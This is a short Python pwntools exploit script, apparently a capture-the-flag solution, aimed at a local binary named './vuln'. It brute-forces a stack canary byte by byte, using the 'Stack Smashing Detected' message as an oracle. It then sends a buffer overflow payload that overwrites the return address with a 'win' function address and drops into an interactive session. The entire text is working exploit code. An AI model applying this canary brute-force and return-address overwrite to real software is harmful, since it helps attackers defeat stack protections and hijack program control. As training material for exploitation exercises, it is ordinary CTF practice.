#!/usr/bin/python
from pwn import *
import string

win_address = 0x80486eb
buffer_size = 32  # before canary
offset_size = 16  # after canary

def attempt(ch):
    p = process('./vuln')

    # How Many Bytes will You Write Into the Buffer?
    # Read the exact number of bytes so that we
    # can get rid of the the trailing newline
    p.sendline(str(len(ch) + buffer_size))

    # Send payload
    p.recvuntil("Input> ")
    p.sendline("A" * buffer_size + ch)

    result = p.recvline()
    p.close()

    if 'Stack Smashing Detected' in result:
        return False
    elif "Ok... Now Where's the Flag?" in result:
        return True

    return False

# Get canary value
canary = ''
for iteration in range(4):
    for ch in string.printable:
        print "Attempt", ch
        if attempt(canary + ch):
            canary += ch
            break
    print "Progress", canary

# form payload
p = process('./vuln')
payload = "A" * buffer_size + canary + "B" * offset_size + p32(win_address)
p.sendline(str(len(payload)))
p.sendline(payload)
p.interactive()

#core = p.corefile
#print "EIP", core.eip
